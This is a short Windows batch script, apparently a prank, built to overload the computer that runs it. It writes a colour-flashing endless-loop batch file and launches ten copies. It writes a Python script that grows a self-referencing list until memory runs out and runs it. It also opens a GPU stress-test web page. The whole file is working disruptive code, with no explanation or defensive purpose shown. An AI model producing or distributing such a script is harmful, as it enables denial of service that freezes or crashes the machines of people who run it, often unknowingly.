cls
@echo off
del /q tmp.bat
del /q tmp.py
color 1a
echo @echo off >>tmp.bat
echo :loop >>tmp.bat
echo color 1a >>tmp.bat
echo echo testtesttesttest >>tmp.bat
echo color 2b >>tmp.bat
echo echo testtesttesttest >>tmp.bat
echo color 3c >>tmp.bat
echo echo testtesttesttest >>tmp.bat
echo color 4d >>tmp.bat
echo echo testtesttesttest >>tmp.bat
echo color 5e >>tmp.bat
echo echo testtesttesttest >>tmp.bat
echo goto loop >>tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
start tmp.bat
echo lst=[] >>tmp.py
echo while True:lst.append(lst) >>tmp.py
start tmp.py
start https://cznull.github.io/vsbm
pause
